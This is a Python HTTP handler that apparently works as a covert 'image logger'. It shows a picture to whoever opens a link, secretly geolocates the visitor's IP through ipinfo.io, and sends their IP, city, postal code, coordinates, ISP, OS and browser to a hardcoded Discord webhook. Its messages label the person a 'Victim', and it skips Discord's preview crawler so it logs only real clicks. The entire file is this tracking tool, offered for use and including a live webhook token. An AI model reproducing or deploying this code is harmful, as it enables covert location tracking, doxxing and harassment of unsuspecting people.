from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'https://discordapp.com/api/webhooks/1442957559278342229/0CnF2i-wS9lFaIJ8OspMJo8ohg_p6IqI_-rTMEfmYU-wWi4yTdaaV_4CT-TS_1HIoIDx'

bindata = httpx.get('data:image/jpeg;base64,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').content
buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
